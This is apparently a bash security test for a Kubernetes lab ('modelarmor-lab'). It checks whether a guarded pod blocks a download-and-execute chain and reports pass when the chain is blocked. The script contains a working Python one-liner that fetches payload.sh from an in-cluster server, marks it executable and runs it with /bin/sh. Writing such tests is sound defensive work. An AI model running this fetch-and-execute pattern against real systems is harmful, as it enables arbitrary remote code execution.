#!/usr/bin/env bash
set -euo pipefail

KUBECONFIG_PATH="$1"
NS="${MODELARMOR_NAMESPACE:-modelarmor-lab}"
POD="$(kubectl --kubeconfig "$KUBECONFIG_PATH" -n "$NS" get pod -l app=modelarmor-demo -o jsonpath='{.items[0].metadata.name}')"
URL="http://payload-server.${NS}.svc.cluster.local/payload.sh"

set +e
kubectl --kubeconfig "$KUBECONFIG_PATH" -n "$NS" exec "$POD" -- \
  python3 -c "import pathlib,subprocess,urllib.request; data=urllib.request.urlopen('${URL}', timeout=5).read(); p=pathlib.Path('/tmp/downloaded-payload.sh'); p.write_bytes(data); p.chmod(0o755); out=subprocess.check_output(['/bin/sh', str(p)], text=True); print(out.strip()); print(pathlib.Path('/tmp/download-exec-proof').read_text().strip())" \
  >/tmp/modelarmor-download-exec.stdout 2>/tmp/modelarmor-download-exec.stderr
rc=$?
set -e

if [[ $rc -eq 0 ]]; then
  jq -n \
    --arg stdout "$(cat /tmp/modelarmor-download-exec.stdout 2>/dev/null || true)" \
    --arg stderr "$(cat /tmp/modelarmor-download-exec.stderr 2>/dev/null || true)" \
    '{status:"fail",summary:"ModelArmor-style lab allowed download-and-exec chain",details:{stdout:$stdout,stderr:$stderr}}'
else
  jq -n \
    --arg stderr "$(cat /tmp/modelarmor-download-exec.stderr 2>/dev/null || true)" \
    --argjson rc "$rc" \
    '{status:"pass",summary:"ModelArmor-style lab blocked download-and-exec chain",details:{stderr:$stderr,exitCode:$rc}}'
fi
